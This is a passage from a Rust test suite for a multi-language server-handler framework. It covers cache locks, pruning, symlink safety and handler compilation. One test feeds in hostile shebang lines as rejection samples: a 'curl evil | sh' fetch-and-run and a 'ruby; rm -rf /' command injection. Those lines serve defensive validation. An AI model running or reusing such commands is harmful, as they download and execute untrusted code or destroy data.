        fs::write(cache.join("a_tmp_yon.kt"), vec![b'a'; 80]).expect("a stage");
        registered.wait();
        std::thread::sleep(Duration::from_millis(50));
        assert!(cache.join("a_tmp_yon.kt").exists());
        fs::rename(cache.join("a_tmp_yon.kt"), cache.join("a.jar")).expect("publish a");
        pruned.wait();
    }

    fn prune_under_pressure(
        cache: &Path,
        registered: &std::sync::Barrier,
        pruned: &std::sync::Barrier,
    ) {
        registered.wait();
        let global = acquire_cache_lock(&cache.join(".prune.lock"), "b").expect("global");
        let _active = acquire_cache_lock(&cache.join("b.lock"), "b").expect("b lock");
        prune_handler_cache_with_limits(cache, 0, 0).expect("pressure prune");
        pruned.wait();
        drop(global);
        fs::write(cache.join("b.jar"), b"b").expect("publish b");
    }

    #[test]
    fn concurrent_active_build_survives_pressure_from_another_digest() {
        let root = tempfile::tempdir().expect("cache");
        let cache = root.path().to_path_buf();
        let registered = std::sync::Barrier::new(2);
        let pruned = std::sync::Barrier::new(2);
        std::thread::scope(|scope| {
            let build_a = scope.spawn(|| build_during_pressure(&cache, &registered, &pruned));
            let build_b = scope.spawn(|| prune_under_pressure(&cache, &registered, &pruned));
            build_a.join().expect("build a");
            build_b.join().expect("build b");
        });
        assert!(cache.join("a.jar").exists());
        assert!(cache.join("b.jar").exists());
        prune_handler_cache_with_limits(&cache, 2, 160).expect("post-publish bound");
        let (entries, bytes) = path_usage(&cache).expect("bounded cache usage");
        assert!(entries <= 3, "cache root plus entries: {entries}");
        assert!(bytes <= 160, "cache bytes: {bytes}");
        assert!(has_no_temporary_entries(&cache));
    }

    #[test]
    fn stale_locks_recover_but_live_owner_locks_are_never_stolen() {
        let root = tempfile::tempdir().expect("cache");
        let stale = root.path().join("stale.lock");
        fs::write(&stale, "4294967294 0 stale-token\n").expect("stale owner");
        let recovered = acquire_cache_lock_with_wait(&stale, "stale", Duration::from_millis(50))
            .expect("stale lock recovers");
        drop(recovered);

        let live = root.path().join("live.lock");
        fs::write(
            &live,
            format!(
                "{} {} live-token\n",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::SystemTime::UNIX_EPOCH)
                    .expect("wall clock")
                    .as_secs()
            ),
        )
        .expect("live owner");
        let failure = acquire_cache_lock_with_wait(&live, "live", Duration::from_millis(30))
            .expect_err("live lock must block");
        assert!(failure.to_string().contains("Timed out"), "{failure}");
        assert!(live.exists());
    }

    #[cfg(unix)]
    #[test]
    fn cache_root_symlinks_fail_closed_without_touching_external_sentinels() {
        use std::os::unix::fs::symlink;

        for link_handlers in [false, true] {
            let root = tempfile::tempdir().expect("project");
            let outside = tempfile::tempdir().expect("outside");
            fs::write(outside.path().join("sentinel"), "keep").expect("sentinel");
            if link_handlers {
                fs::create_dir(root.path().join(".tachyon")).expect("tachyon");
                symlink(outside.path(), root.path().join(".tachyon/handlers"))
                    .expect("handlers link");
            } else {
                symlink(outside.path(), root.path().join(".tachyon")).expect("tachyon link");
            }
            write(
                root.path(),
                "server/workers/handler.kt",
                b"\nobject Handler { @JvmStatic fun GET(): Any? = mapOf<String, Any?>() }",
            );
            let failure = HandlerSource::discover(root.path(), "server/workers/handler.kt")
                .expect_err("cache symlink");
            assert!(failure.to_string().contains("non-symlinked"), "{failure}");
            assert_eq!(
                fs::read_to_string(outside.path().join("sentinel")).expect("sentinel"),
                "keep"
            );
            assert_eq!(fs::read_dir(outside.path()).expect("outside").count(), 1);
        }
    }

    #[cfg(unix)]
    #[test]
    fn cache_child_symlinks_never_reach_external_sentinels() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        let outside = tempfile::tempdir().expect("outside");
        let sentinel = outside.path().join("sentinel");
        fs::write(&sentinel, "keep").expect("sentinel");
        for name in [
            "Yon.java",
            "yon-runtime.php",
            "yon-handler.php",
            "yon-entry.php",
            "generic-stage.rs",
        ] {
            let child = root.path().join(name);
            symlink(&sentinel, &child).expect("child link");
            let failure = stage_cached_bytes(&child, b"replacement", name).expect_err("symlink");
            assert!(failure.to_string().contains("symlink"), "{failure}");
            fs::remove_file(child).expect("remove link");
        }

        assert_eq!(fs::read_to_string(&sentinel).expect("sentinel"), "keep");
    }

    #[test]
    fn owned_cache_file_collisions_are_never_cleaned_up() {
        let root = tempfile::tempdir().expect("cache");

        let file = root.path().join("generic-stage.tmp");
        fs::write(&file, b"original").expect("file sentinel");
        write_owned_file(&file, b"replacement", "generic stage").expect_err("file collision");
        assert_eq!(fs::read(&file).expect("file sentinel"), b"original");

        let directory = root.path().join("cached-bytes.tmp");
        fs::create_dir(&directory).expect("directory sentinel");
        fs::write(directory.join("sentinel"), b"original").expect("nested sentinel");
        write_owned_file(&directory, b"replacement", "cached bytes")
            .expect_err("directory collision");
        assert_eq!(
            fs::read(directory.join("sentinel")).expect("nested sentinel"),
            b"original"
        );
    }

    #[cfg(unix)]
    #[test]
    fn owned_cache_file_symlink_collision_is_never_cleaned_up() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        let outside = tempfile::tempdir().expect("outside");
        let sentinel = outside.path().join("sentinel");
        fs::write(&sentinel, b"original").expect("sentinel");
        let link = root.path().join("generic-stage.tmp");
        symlink(&sentinel, &link).expect("link");

        write_owned_file(&link, b"replacement", "generic stage").expect_err("symlink collision");
        assert!(
            fs::symlink_metadata(&link)
                .expect("link remains")
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read(&sentinel).expect("sentinel"), b"original");
    }

    #[test]
    fn compiler_attempt_collisions_are_never_cleaned_up() {
        let root = tempfile::tempdir().expect("cache");

        for purpose in ["compiler", "C# compiler"] {
            let file = root.path().join(format!("{purpose}-file"));
            fs::write(&file, b"original").expect("file sentinel");
            assert!(
                reserve_attempt_directory(&file, purpose, purpose).is_err(),
                "file collision must fail"
            );
            assert_eq!(fs::read(&file).expect("file sentinel"), b"original");

            let directory = root.path().join(format!("{purpose}-directory"));
            fs::create_dir(&directory).expect("directory sentinel");
            fs::write(directory.join("sentinel"), b"original").expect("nested sentinel");
            assert!(
                reserve_attempt_directory(&directory, purpose, purpose).is_err(),
                "directory collision must fail"
            );
            assert_eq!(
                fs::read(directory.join("sentinel")).expect("nested sentinel"),
                b"original"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn compiler_attempt_symlink_collisions_are_never_cleaned_up() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        let outside = tempfile::tempdir().expect("outside");
        let sentinel = outside.path().join("sentinel");
        fs::write(&sentinel, b"original").expect("sentinel");
        for purpose in ["compiler", "C# compiler"] {
            let link = root.path().join(format!("{purpose}-link"));
            symlink(&sentinel, &link).expect("link");
            assert!(
                reserve_attempt_directory(&link, purpose, purpose).is_err(),
                "symlink collision must fail"
            );
            assert!(
                fs::symlink_metadata(&link)
                    .expect("link remains")
                    .file_type()
                    .is_symlink()
            );
            assert_eq!(fs::read(&sentinel).expect("sentinel"), b"original");
        }
    }

    #[test]
    fn staged_cache_destination_collisions_fail_closed_and_remain_unchanged() {
        let root = tempfile::tempdir().expect("cache");
        let file = root.path().join("yon-handler.php");
        fs::write(&file, b"original").expect("file sentinel");
        stage_cached_bytes(&file, b"replacement", "stage cached bytes")
            .expect_err("mismatched existing file");
        assert_eq!(fs::read(&file).expect("file sentinel"), b"original");

        let directory = root.path().join("Yon.java");
        fs::create_dir(&directory).expect("directory sentinel");
        fs::write(directory.join("sentinel"), b"original").expect("nested sentinel");
        stage_cached_bytes(&directory, b"replacement", "stage cached bytes")
            .expect_err("directory collision");
        assert_eq!(
            fs::read(directory.join("sentinel")).expect("nested sentinel"),
            b"original"
        );
    }

    #[test]
    fn temporary_file_guard_never_removes_a_replacement() {
        let root = tempfile::tempdir().expect("cache");
        let reserved = root.path().join("attempt.tmp");
        fs::write(&reserved, b"owned").expect("owned file");
        let guard = TemporaryCachePath::file(&reserved);
        let moved = root.path().join("moved-owned.tmp");
        fs::rename(&reserved, &moved).expect("move owned file");
        fs::write(&reserved, b"replacement").expect("replacement file");

        drop(guard);

        assert_eq!(
            fs::read(&reserved).expect("replacement survives"),
            b"replacement"
        );
        assert_eq!(fs::read(&moved).expect("moved object survives"), b"owned");
    }

    #[test]
    fn temporary_directory_guard_never_removes_a_replacement() {
        let root = tempfile::tempdir().expect("cache");
        let reserved = root.path().join("attempt");
        fs::create_dir(&reserved).expect("owned directory");
        fs::write(reserved.join("owned"), b"owned").expect("owned sentinel");
        let guard = TemporaryCachePath::directory(&reserved);
        let moved = root.path().join("moved-owned");
        fs::rename(&reserved, &moved).expect("move owned directory");
        fs::create_dir(&reserved).expect("replacement directory");
        fs::write(reserved.join("replacement"), b"replacement").expect("replacement sentinel");

        drop(guard);

        assert_eq!(
            fs::read(reserved.join("replacement")).expect("replacement survives"),
            b"replacement"
        );
        assert_eq!(
            fs::read(moved.join("owned")).expect("moved object survives"),
            b"owned"
        );
    }

    #[test]
    fn old_lock_owner_cannot_delete_a_replacement_lock() {
        let root = tempfile::tempdir().expect("cache");
        let path = root.path().join("replace.lock");
        let old = acquire_cache_lock_with_wait(&path, "old", Duration::from_millis(20))
            .expect("old lock");
        fs::remove_file(&path).expect("simulate replacement race");
        fs::write(
            &path,
            format!("{} 0 replacement-token\n", std::process::id()),
        )
        .expect("replacement");
        drop(old);
        assert!(path.exists(), "old owner deleted replacement");
        assert!(
            fs::read_to_string(path)
                .expect("replacement")
                .contains("replacement-token")
        );
    }

    #[test]
    fn simultaneous_stale_recovery_yields_exactly_one_owner() {
        let root = tempfile::tempdir().expect("cache");
        let path = root.path().join("stale.lock");
        fs::write(&path, "4294967294 0 stale-token\n").expect("stale");
        let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
        let holds: Vec<(std::time::Instant, std::time::Instant)> = std::thread::scope(|scope| {
            let attempts: Vec<_> = (0..2)
                .map(|_| {
                    let barrier = std::sync::Arc::clone(&barrier);
                    let path = path.clone();
                    scope.spawn(move || {
                        barrier.wait();
                        let lock =
                            acquire_cache_lock_with_wait(&path, "race", Duration::from_millis(30))
                                .ok()?;
                        let acquired = std::time::Instant::now();
                        std::thread::sleep(Duration::from_millis(80));
                        let releasing = std::time::Instant::now();
                        drop(lock);
                        Some((acquired, releasing))
                    })
                })
                .collect();
            attempts
                .into_iter()
                .filter_map(|attempt| attempt.join().expect("join"))
                .collect()
        });
        // Under load the waiter may take the lock after the first owner lets go; it must never share it.
        assert!(!holds.is_empty(), "nobody recovered the stale lock");
        if let [
            (first_acquired, first_released),
            (second_acquired, second_released),
        ] = holds[..]
        {
            let sequential = first_released <= second_acquired || second_released <= first_acquired;
            assert!(sequential, "two owners held the lock at once: {holds:?}");
        }
    }

    #[test]
    fn failed_lock_metadata_initialization_removes_the_new_lock() {
        let root = tempfile::tempdir().expect("cache");
        let path = root.path().join("attempt.lock");
        let failure = acquire_cache_lock_with_initializer(
            &path,
            "attempt",
            Duration::from_millis(20),
            |_file, _pid, _created, _token| Err(std::io::Error::other("injected sync failure")),
        )
        .expect_err("initialization must fail");
        assert!(
            failure.to_string().contains("injected sync failure"),
            "{failure}"
        );
        assert!(!path.exists(), "failed initialization left a lock");
        let acquired = acquire_cache_lock_with_wait(&path, "attempt", Duration::from_millis(20))
            .expect("subsequent acquisition");
        assert!(path.exists());
        drop(acquired);
        assert!(!path.exists());
    }

    #[test]
    fn cache_pruning_surfaces_failed_removal_without_falsifying_bounds() {
        let root = tempfile::tempdir().expect("cache");
        fs::write(root.path().join("a"), vec![b'x'; 40]).expect("entry");
        fs::write(root.path().join("b"), vec![b'x'; 40]).expect("entry");
        let failure = prune_handler_cache_with_remover(root.path(), 1, 40, |_| {
            Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "injected removal refusal",
            ))
        })
        .expect_err("failed removal must surface");
        assert_eq!(failure.kind(), std::io::ErrorKind::PermissionDenied);
        assert!(root.path().join("a").exists());
        assert!(root.path().join("b").exists());
    }

    #[test]
    fn cache_pruning_surfaces_traversal_and_size_accounting_failures() {
        let missing = tempfile::tempdir().expect("parent").path().join("missing");
        assert_eq!(
            prune_handler_cache_with_limits(&missing, 1, 1)
                .expect_err("missing traversal")
                .kind(),
            std::io::ErrorKind::NotFound
        );

        let root = tempfile::tempdir().expect("cache");
        fs::write(root.path().join("entry"), b"bytes").expect("entry");
        let measured = prune_handler_cache_with_operations(
            root.path(),
            0,
            0,
            |_| Ok(()),
            |_| Err(std::io::Error::other("injected metadata/read failure")),
        )
        .expect_err("measurement failure must surface");
        assert!(measured.to_string().contains("metadata/read"));
        assert!(root.path().join("entry").exists());
    }

    #[cfg(unix)]
    #[test]
    fn cache_pruning_rejects_unaccountable_entry_types() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        symlink(root.path().join("missing"), root.path().join("dangling")).expect("symlink");
        let failure = prune_handler_cache_with_limits(root.path(), 0, 0)
            .expect_err("symlink size cannot be silently zero");
        assert_eq!(failure.kind(), std::io::ErrorKind::InvalidData);
        assert!(fs::symlink_metadata(root.path().join("dangling")).is_ok());
    }

    #[test]
    fn csharp_cache_requires_complete_matching_metadata_and_assembly() {
        let root = tempfile::tempdir().expect("cache");
        fs::create_dir_all(root.path().join("one/out")).expect("out");
        for name in super::CsharpRuntime::FILES {
            fs::write(root.path().join("one/out").join(name), b"artifact").expect("artifact");
        }
        let cache = CacheDirectory::open_test_root(root.path()).expect("cache capability");
        assert!(!valid_csharp_cache(&cache, "one", "digest=one\n"));
        fs::write(root.path().join("one/.complete"), "digest=wrong\n").expect("metadata");
        assert!(!valid_csharp_cache(&cache, "one", "digest=one\n"));
        fs::write(root.path().join("one/.complete"), "digest=one\n").expect("metadata");
        assert!(valid_csharp_cache(&cache, "one", "digest=one\n"));
    }

    #[test]
    fn compiled_cache_key_separates_toolchains_and_host_targets() {
        let key = |compiler, arch, os| compiled_digest(b"source", b"protocol", compiler, arch, os);
        assert_ne!(
            key("rustc 1", "x86_64", "linux"),
            key("rustc 2", "x86_64", "linux")
        );
        assert_ne!(
            key("rustc 1", "x86_64", "linux"),
            key("rustc 1", "aarch64", "linux")
        );
        assert_ne!(
            key("rustc 1", "x86_64", "linux"),
            key("rustc 1", "x86_64", "macos")
        );
    }

    fn write(root: &Path, relative: &str, bytes: &[u8]) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().expect("parent")).expect("directory");
        fs::write(path, bytes).expect("source");
    }

    fn command_available(program: &str) -> bool {
        command_succeeds(program, "-version")
    }

    fn command_succeeds(program: &str, argument: &str) -> bool {
        std::process::Command::new(program)
            .arg(argument)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .is_ok_and(|status| status.success())
    }

    fn runtime_artifact(source: &HandlerSource) -> std::path::PathBuf {
        std::path::PathBuf::from(source.interpreter().last().expect("artefact"))
    }

    fn modified_time(path: &Path) -> std::time::SystemTime {
        std::fs::metadata(path)
            .expect("metadata")
            .modified()
            .expect("mtime")
    }

    fn discover_twice_at_once(root: &Path, relative: &str) {
        std::thread::scope(|scope| {
            let left = scope.spawn(|| HandlerSource::discover(root, relative).expect("left build"));
            let right =
                scope.spawn(|| HandlerSource::discover(root, relative).expect("right build"));
            let left_source = left.join().expect("left join");
            let right_source = right.join().expect("right join");
            let left = runtime_artifact(&left_source);
            let right = runtime_artifact(&right_source);
            assert_ne!(left, right);
            assert_eq!(
                fs::read(left).expect("left copy"),
                fs::read(right).expect("right copy")
            );
        });
    }

    fn assert_cache_within_bounds(cache_root: &Path) {
        let (entries, bytes) = path_usage(cache_root).expect("usage");
        assert!(entries <= 257, "recursive cache entries: {entries}");
        assert!(bytes <= 512 * 1024 * 1024, "cache bytes: {bytes}");
    }

    fn has_no_temporary_entries(cache_root: &Path) -> bool {
        fs::read_dir(cache_root)
            .expect("cache")
            .flatten()
            .all(|entry| !entry.file_name().to_string_lossy().contains("tmp"))
    }

    fn cached_jar(cache_root: &Path) -> std::path::PathBuf {
        for entry in fs::read_dir(cache_root).expect("cache").flatten() {
            let path = entry.path();
            if path.extension().is_some_and(|extension| extension == "jar") {
                return path;
            }
        }
        panic!("cached jar");
    }

    #[cfg(windows)]
    #[test]
    fn php_cli_paths_use_unambiguous_windows_separators() {
        assert_eq!(
            super::php_cli_path(Path::new(r"C:\runtime\yon-runtime.php")),
            "C:/runtime/yon-runtime.php"
        );
    }

    #[test]
    fn quoted_runtime_arguments_remain_workspace_validated() {
        let workspace =
            super::RuntimeWorkspace::new("server/workers/handler.php").expect("workspace");
        for (option, name) in [
            ("auto_prepend_file", "yon-runtime.php"),
            ("auto_append_file", "yon-entry.php"),
        ] {
            let runtime = workspace.path().join(name);
            fs::write(&runtime, "<?php").expect("runtime");
            let argument = format!("{option}=\"{}\"", super::php_cli_path(&runtime));
            super::validate_runtime_workspace_paths(
                &[argument],
                &workspace,
                "server/workers/handler.php",
            )
            .expect("quoted path remains inside workspace");
        }
    }

    #[tokio::test]
    async fn php_handlers_run_under_php_cgi_with_the_native_header_functions() {
        if !command_succeeds("php-cgi", "-v") {
            return;
        }
        let root = tempfile::tempdir().expect("project");
        let relative = "server/workers/handler.php";
        write(
            root.path(),
            relative,
            br"<?php
class Handler {
    public static function GET(): void {
        header('X-Native: yes');
        header('X-Gone: 1');
        header_remove('X-Gone');
        http_response_code(201);
        echo json_encode([
            'internal' => (new ReflectionFunction('header'))->isInternal(),
            'headers' => headers_list(),
            'directory' => getcwd(),
            'limit' => ini_get('max_execution_time'),
        ]);
    }
}
",
        );
        let source = HandlerSource::discover(root.path(), relative).expect("PHP source");
        assert_eq!(source.interpreter[0], "php-cgi");
        assert!(
            !source
                .interpreter
                .iter()
                .any(|argument| argument.contains("disable_functions")),
            "{:?}",
            source.interpreter
        );
        let supervisor = crate::HandlerSupervisor::new(crate::HandlerSupervisorOptions::default())
            .expect("supervisor");
        let request = tachyon_contracts::HandlerRequest::route(
            "native_php",
            "/",
            tachyon_contracts::HttpMethod::Get,
        );
        let response = supervisor
            .invoke(&source, &request, &crate::HandlerCancellation::default())
            .await
            .expect("PHP response");
        assert_eq!(response.status, 201, "{response:?}");
        assert_eq!(
            response.headers.get("x-native").map(Vec::as_slice),
            Some(&[String::from("yes")][..]),
            "{response:?}"
        );
        assert!(!response.headers.contains_key("x-gone"), "{response:?}");
        assert!(
            !response.headers.contains_key("x-powered-by"),
            "{response:?}"
        );
        let body: serde_json::Value =
            serde_json::from_str(&response.body.expect("response body").data).expect("JSON body");
        assert_eq!(body["internal"], true, "{body}");
        assert_eq!(
            body["headers"],
            serde_json::json!(["X-Native: yes"]),
            "{body}"
        );
        let directory = PathBuf::from(body["directory"].as_str().expect("directory"));
        assert_eq!(
            directory.canonicalize().expect("directory"),
            source
                .execution_working_directory()
                .canonicalize()
                .expect("working directory"),
            "{body}"
        );
        assert_eq!(body["limit"], "0", "{body}");
    }

    #[tokio::test]
    async fn generated_php_bootstrap_preserves_preamble_and_captures_before_initialization() {
        if !command_succeeds("php-cgi", "-v") {
            return;
        }
        let root = tempfile::tempdir().expect("project");
        let relative = "server/workers/handler.php";
        write(
            root.path(),
            relative,
            b"<?php\nclass Handler { public static function GET(): array { return []; } }\n",
        );
        let mut source = HandlerSource::discover(root.path(), relative).expect("authored source");
        let generated = br"<?php
declare(strict_types=1);
namespace {
use DateTimeImmutable as Clock;
putenv('YON_BOOTSTRAP_TEST=from-generated-initialization');
usleep(200000);
final class Handler {
    public static function GET(): array {
        return [
            'year' => (new Clock('2026-09-25'))->format('Y'),
            'ordinary' => YonRelayContext::environment()['YON_BOOTSTRAP_TEST'] ?? null,
            'remaining' => YonRelayContext::timeLeftNanoseconds(),
        ];
    }
}
}
";
        let cache_root = tempfile::tempdir().expect("generated cache");
        let cache = CacheDirectory::open_test_root(cache_root.path()).expect("cache capability");
        let prepared =
            super::prepare_php(&cache, relative, generated).expect("generated PHP preparation");
        source.interpreter = prepared.interpreter;
        source.prepared_workspace = Some(prepared.workspace);
        let supervisor = crate::HandlerSupervisor::new(crate::HandlerSupervisorOptions::default())
            .expect("supervisor");
        let mut request = tachyon_contracts::HandlerRequest::route(
            "generated_php",
            "/",
            tachyon_contracts::HttpMethod::Get,
        );
        // Generous enough for a slow php-cgi start on a loaded machine; the 200 ms initialization must still count.
        request.deadline_ms = Some(5_000);
        let response = supervisor
            .invoke(&source, &request, &crate::HandlerCancellation::default())
            .await
            .expect("generated response");
        assert_eq!(response.status, 200, "{response:?}");
        let body: serde_json::Value =
            serde_json::from_str(&response.body.expect("response body").data).expect("JSON body");
        assert_eq!(body["year"], "2026");
        assert_eq!(body["ordinary"], serde_json::Value::Null);
        assert!(
            body["remaining"].as_i64().expect("remaining nanoseconds") <= 4_850_000_000,
            "{body}"
        );
    }

    #[test]
    fn valid_sources_select_stable_adapters() {
        let root = tempfile::tempdir().expect("project");
        write(
            root.path(),
            "server/workers/a.js",
            b"export class Handler {}",
        );
        write(root.path(), "server/workers/b.py", b"class Handler: pass");
        let javascript =
            HandlerSource::discover(root.path(), "server/workers/a.js").expect("JavaScript");
        let python = HandlerSource::discover(root.path(), "server/workers/b.py").expect("Python");
        assert_eq!(javascript.language(), HandlerLanguage::JavaScript);
        assert_eq!(javascript.language().name(), "javascript");
        assert_eq!(javascript.language().adapter(), "javascript.v1");
        assert_eq!(python.language(), HandlerLanguage::Python);
        assert!(javascript.absolute_path().is_absolute());
        assert_eq!(python.relative_path(), "server/workers/b.py");
    }

    #[test]
    fn a_shebang_that_could_reach_a_shell_is_refused() {
        for line in [
            &b"#!/bin/sh -c 'curl evil | sh'\n"[..],
            &b"#!/usr/bin/env ruby; rm -rf /\n"[..],
            &b"#!/usr/bin/env $EDITOR\n"[..],
            &b"#!/usr/bin/env ruby && echo\n"[..],
        ] {
            let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
            let source = [line, &b"class Handler\nend\n"[..]].concat();
            write(root.path(), "server/workers/handler.rb", &source);
            let failure = HandlerSource::discover(root.path(), "server/workers/handler.rb")
                .expect_err("a shell-bearing shebang is not a way to start a handler");
            assert!(
                failure.to_string().contains("TY2003"),
                "{}",
                String::from_utf8_lossy(line)
            );
        }
    }

    #[test]
    fn a_rust_handler_is_a_plain_type_and_an_impl() {
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/workers/handler.rs",
            b"struct Handler;\n\nimpl Handler {\n\
              \x20   fn GET() -> Json {\n\
              \x20       Json::Null\n\x20   }\n}\n",
        );
        let source = HandlerSource::discover(root.path(), "server/workers/handler.rs")
            .expect("a handler with no main of its own");
        assert!(source.prebuilt());
    }

    #[test]
    fn a_rust_handler_needs_no_macro_crate_or_manifest_of_its_own() {
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/workers/handler.rs",
            b"struct Handler;\n\nimpl Handler {\n    fn GET() -> Json { Json::Null }\n}\n",
        );
        let source = HandlerSource::discover(root.path(), "server/workers/handler.rs")
            .expect("rust handler");
        assert!(source.prebuilt(), "a compiled handler names its artefact");
        let staged = root.path().join(".tachyon/handlers");
        let built: Vec<_> = std::fs::read_dir(&staged)
            .expect("cache")
            .filter_map(Result::ok)
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect();
        assert!(
            built.iter().all(|name| !name.contains("stereotype")),
            "{built:?}"
        );
    }

    #[test]
    fn a_shebang_is_refused_because_yon_knows_how_to_start_its_languages() {
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/workers/handler.php",
            b"#!/usr/bin/env php\n<?php\nclass Handler {}\n",
        );
        let failure = HandlerSource::discover(root.path(), "server/workers/handler.php")
            .expect_err("a handler that says how to run itself");
        let rendered = failure.to_string();
        assert!(rendered.contains("TY2003"), "{rendered}");
        assert!(rendered.contains("Delete the first line"), "{rendered}");
    }

    #[test]
    fn unsupported_entries_keep_language_diagnostics_before_role_discovery() {
        for extension in ["pl", "swift"] {
            let root = tempfile::tempdir().expect("unsupported language project");
            let entry = format!("server/workers/handler.{extension}");
            write(
                root.path(),
                &entry,
                b"// No supported Yon entry language.\n",
            );
            write(
                root.path(),
                &format!("server/services/MoneyService.{extension}"),
                b"@Service\nclass MoneyService {}\n",
            );
            let failure = HandlerSource::discover(root.path(), &entry)
                .expect_err("unsupported entries cannot compose roles");
            let rendered = failure.to_string();
            assert!(rendered.contains("TY2003"), "{rendered}");
            assert!(rendered.contains("relay(...)"), "{rendered}");
            assert!(!root.path().join(".tachyon/handlers").exists());
        }
    }

    #[test]
    fn yon_runs_only_its_framework_owned_languages() {
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        for (name, body) in [
            ("server/workers/handler.nim", &b"echo \"hello\"\n"[..]),
            (
                "server/workers/handler.zig",
                &b"const std = @import(\"std\");\n"[..],
            ),
            ("server/workers/handler.sh", &b"#!/bin/sh\necho\n"[..]),
            ("server/workers/handler.pl", &b"#!/usr/bin/env perl\n"[..]),
        ] {
            write(root.path(), name, body);
            let failure = HandlerSource::discover(root.path(), name)
                .expect_err(&format!("{name} is not a Yon language"));
            let rendered = failure.to_string();
            assert!(rendered.contains("TY2003"), "{rendered}");
            for supported in crate::convention::YonConvention::EXTENSIONS {
                assert!(rendered.contains(&format!("yon.{supported}")), "{rendered}");
            }
        }
    }

    struct GoSources;

    impl GoSources {
        const HANDLER: &[u8] = b"type Handler struct{}\n\nfunc (Handler) GET() any {\n\treturn map[string]any{\"ok\": true}\n}\n";
        const CHANGED: &[u8] = b"type Handler struct{}\n\nfunc (Handler) GET() any {\n\treturn map[string]any{\"ok\": false}\n}\n";
    }

    fn go_available() -> bool {
        if command_succeeds("go", "version") {
            return true;
        }
        let required = cfg!(unix) && std::env::var_os("CI").is_some();
        assert!(!required, "go is required for the Go handler tests in CI");
        eprintln!("skipping: go is unavailable");
        false
    }

    fn cached_go_binaries(cache_root: &Path) -> Vec<std::path::PathBuf> {
        let mut found = Vec::new();
        for entry in fs::read_dir(cache_root).expect("cache").flatten() {
            let name = entry.file_name().to_string_lossy().into_owned();
            let digest = name.strip_suffix(".exe").unwrap_or(&name);
            if digest.len() == 64 && digest.bytes().all(|byte| byte.is_ascii_hexdigit()) {
                found.push(entry.path());
            }
        }
        found.sort();
        found
    }

    #[test]
    fn a_go_handler_is_compiled_once_and_reused() {
        if !go_available() {
            return;
        }
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(root.path(), "server/workers/handler.go", GoSources::HANDLER);
        let first = HandlerSource::discover(root.path(), "server/workers/handler.go").expect("go");
        assert!(first.prebuilt(), "a compiled handler names its artefact");
        let cache_root = root.path().join(".tachyon/handlers");
        let built = cached_go_binaries(&cache_root);
        assert_eq!(built.len(), 1, "{built:?}");
        let stamp = modified_time(&built[0]);

        let second = HandlerSource::discover(root.path(), "server/workers/handler.go").expect("go");
        assert_ne!(runtime_artifact(&second), runtime_artifact(&first));
        assert_eq!(cached_go_binaries(&cache_root), built);
        assert_eq!(
            modified_time(&built[0]),
            stamp,
            "an unchanged handler must not be rebuilt"
        );

        write(root.path(), "server/workers/handler.go", GoSources::CHANGED);
        HandlerSource::discover(root.path(), "server/workers/handler.go").expect("changed go");
        assert_eq!(cached_go_binaries(&cache_root).len(), 2);
    }

    #[test]
    fn a_csharp_artefact_is_keyed_on_the_framework_it_was_built_against() {
        const HANDLER: &[u8] = b"class Handler {}";
        assert_ne!(
            csharp_digest(HANDLER, "net9.0"),
            csharp_digest(HANDLER, "net10.0"),
            "a framework change has to produce a new artefact"
        );
        assert_eq!(
            csharp_digest(HANDLER, "net10.0"),
            csharp_digest(HANDLER, "net10.0"),
            "an unchanged handler on an unchanged framework is still reused"
        );
        assert_ne!(
            csharp_digest(HANDLER, "net10.0"),
            csharp_digest(b"class Handler { static int value = 1; }", "net10.0"),
            "a changed handler still produces a new artefact"
        );
    }

    #[test]
    fn an_ahead_of_time_language_is_compiled_once_and_reused() {
        if !command_available("kotlinc") {
            return;
        }
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/workers/handler.kt",
            b"object Handler {\n\
              \x20   @JvmStatic fun GET(): Any? = mapOf<String, Any?>()\n}\n",
        );
        let first =
            HandlerSource::discover(root.path(), "server/workers/handler.kt").expect("kotlin");
        assert!(first.prebuilt(), "a compiled handler names its artefact");
        let first_runtime = runtime_artifact(&first);
        assert!(first_runtime.is_file(), "{first_runtime:?}");
        let cache_root = root.path().join(".tachyon/handlers");
        let artefact = cached_jar(&cache_root);
        let stamp = modified_time(&artefact);

        let second =
            HandlerSource::discover(root.path(), "server/workers/handler.kt").expect("kotlin");
        let second_runtime = runtime_artifact(&second);
        assert_ne!(second_runtime, first_runtime);
        assert_eq!(
            fs::read(&second_runtime).expect("second copy"),
            fs::read(&first_runtime).expect("first copy")
        );
        assert_eq!(
            modified_time(&artefact),
            stamp,
            "an unchanged handler must not be rebuilt"
        );

        fs::write(&artefact, []).expect("partial artifact");
        let repaired = HandlerSource::discover(root.path(), "server/workers/handler.kt")
            .expect("partial cache is rebuilt");
        assert!(runtime_artifact(&repaired).is_file());
        assert!(fs::metadata(&artefact).expect("repaired").len() > 0);

        fs::remove_file(&artefact).expect("remove artifact");
        discover_twice_at_once(root.path(), "server/workers/handler.kt");
        assert!(fs::metadata(&artefact).expect("published").len() > 0);
        let temporary: Vec<_> = fs::read_dir(&cache_root)
            .expect("cache entries")
            .flatten()
            .filter(|entry| entry.file_name().to_string_lossy().contains("tmp"))
            .collect();
        assert!(temporary.is_empty(), "{temporary:?}");
        assert_cache_within_bounds(&cache_root);
    }

    #[test]
    fn concurrent_csharp_publication_leaves_cache_within_recursive_bounds() {
        if !command_succeeds("dotnet", "--version") {
            return;
        }
